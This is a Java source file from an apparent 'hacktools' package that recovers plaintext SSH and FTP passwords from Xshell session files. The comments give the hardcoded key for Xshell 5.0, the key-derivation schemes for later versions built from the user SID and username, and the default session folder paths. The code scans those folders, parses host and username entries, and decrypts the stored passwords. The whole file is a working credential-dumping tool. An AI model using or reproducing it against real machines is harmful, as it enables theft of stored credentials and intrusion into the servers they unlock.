package com.darkerbox.hacktools.Encrypt;

import com.darkerbox.utils.CommonUtils;
import com.darkerbox.utils.Rc4Utils;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/*
* XShell5.0 的密钥为!X@s#h$e%l^l&
* Xshell5.0以上 的密钥为用户的SID进行sha256加密
* Xshell6.0以上 的密钥为用户的SID+用户名进行sha256加密
* Xshell7.0以上 的密钥为用户名先反转字节，然后加上SID，然后再进行字节翻转，然后进行sha256加密。
* */

/*
* xshell7:    C:\Users\%username%\Documents\NetSarang Computer\7\Xshell\Sessions
xshell6:    C:\Users\%username%\Documents\NetSarang Computer\6\Xshell\Sessions
XShell5:  %userprofile%\Documents\NetSarang\Xshell\Sessions

XFtp5:     %userprofile%\Documents\NetSarang\Xftp\Sessions
XShell6:   %userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions
XFtp6:      %userprofile%\Documents\NetSarang Computer\6\Xftp\Sessions
* */

public class XshellDecrypt {
	private String xshPathdir;
	private String username;
	private String sid;

	public XshellDecrypt(){

	}

	public XshellDecrypt(String xshPath,String username,String sid){
		this.xshPathdir = xshPath;
		this.username = username;
		this.sid = sid;
	}

	public ArrayList<XshellResult> Xdecrypt() throws Exception {
		String password = null;
		ArrayList<XshellResult> results = new ArrayList<>();
		if(!this.xshPathdir.endsWith(File.separator))
			this.xshPathdir = this.xshPathdir+File.separator;
		// 获取目录下所有的文件
		List<String> filelist = CommonUtils.listAllFile(new File(this.xshPathdir));
		for (int i = 0; i < filelist.size(); i++) {
			if (filelist.get(i).endsWith(".xsh")){
				String xshPath = this.xshPathdir+filelist.get(i);
				// 解析xshell文件的信息
				String[] xshinfo= XSHParser(xshPath);
				// 解密Password
				String realpassword = decrypt(xshinfo[2],xshinfo[3]);
				results.add(new XshellResult(xshPath,xshinfo[0],xshinfo[1],realpassword,xshinfo[3]));
			}
		}
		return results;
	}

	private String[] XSHParser(String xshPath) throws Exception{
		String[] temp = new String[4];
		String filecontent = CommonUtils.getFileContent(xshPath);
		temp[0] = CommonUtils.reCompile("Host=(.*?)[\n|\r\n]",filecontent);
		temp[1] = CommonUtils.reCompile("UserName=(.*?)[\n|\r\n]",filecontent);
		temp[2] = CommonUtils.reCompile("Password=(.*?)[\n|\r\n]",filecontent);
		temp[3] = CommonUtils.reCompile("\\[SessionInfo\\][\n|\r\n]Version=(.*?)[\n|\r\n]",filecontent);

		return temp;
	}

	private String decrypt(String cryptPass,String version) throws Exception{
		String password = null;
		// 如果匹配不到版本，则就默认用低版本的来解密
		if (version==null || version.startsWith("5.0") || version.startsWith("4") || version.startsWith("3") || version.startsWith("2"))
		{
			byte[] data = CommonUtils.b64decode(cryptPass);;
			byte[] Key =  CommonUtils.md5Byte("!X@s#h$e%l^l&".getBytes());

			byte[] decrypted;
			// 如果长度不足0x20应该是不需要减0x20的，直接进行解密
			if (data.length<0x20){
				decrypted = Rc4Utils.RC4Base(data, Key );
			}else{
			    byte[] passData = Arrays.copyOf(data,data.length - 0x20);
				decrypted = Rc4Utils.RC4Base(passData, Key );
			}

			password = new String(decrypted);
		}
		else if (version.startsWith("5.1") || version.startsWith("5.2"))
		{
			byte[] data = CommonUtils.b64decode(cryptPass);
			byte[] Key = CommonUtils.sha256(this.sid);
			
			byte[] passData = Arrays.copyOf(data,data.length - 0x20);
			byte[] decrypted = Rc4Utils.RC4Base(passData, Key );
			password = new String(decrypted);
		}
		else if (version.startsWith("5") || version.startsWith("6") || version.startsWith("7.0"))
		{
			byte[] data = CommonUtils.b64decode(cryptPass);
			byte[] Key = CommonUtils.sha256(this.username + this.sid);
			
			byte[] passData = Arrays.copyOf(data,data.length - 0x20);
			byte[] decrypted = Rc4Utils.RC4Base(passData, Key );
			password = new String(decrypted);
		}else if (version.startsWith("7"))
		{

			String strkey1 = new String(reverse(this.username.getBytes())) + this.sid;
			String strkey2 = new String(reverse(strkey1.getBytes()));
			byte[] data = CommonUtils.b64decode(cryptPass);
			byte[] Key = CommonUtils.sha256(strkey2);
			
			byte[] passData = Arrays.copyOf(data,data.length - 0x20);
			byte[] decrypted = Rc4Utils.RC4Base(passData, Key );
			password = new String(decrypted);
		}

		return password;
	}

	public static byte[] reverse(byte[] str)
	{
		// 如果字符串为空或空则返回
		if (str == null || str.equals("")) {
			return str;
		}

		// 将字符串转换为字节
		byte[] bytes = str;

		// 从给定字符串的两个端点 `l` 和 `h` 开始
		// 并在循环的每次迭代中增加 `l` 并减少 `h`
		// 直到两个端点相交 (l >= h)
		for (int l = 0, h = str.length - 1; l < h; l++, h--)
		{
			// 交换 `l` 和 `h` 的值
			byte temp = bytes[l];
			bytes[l] = bytes[h];
			bytes[h] = temp;
		}

		// 将字节数组转换回字符串
		return bytes;
	}

}

class XshellResult{
	public String xshellpath;
	public String host;
	public String username;
	public String password;
	public String version;

	public XshellResult(String xshellpath, String host, String username, String password, String version) {
		this.xshellpath = xshellpath;
		this.host = host;
		this.username = username;
		this.password = password;
		this.version = version;
	}

	public String getXshellpath() {
		return xshellpath;
	}

	public String getHost() {
		return host;
	}

	public String getUsername() {
		return username;
	}

	public String getPassword() {
		return password;
	}

	public String getVersion() {
		return version;
	}
}
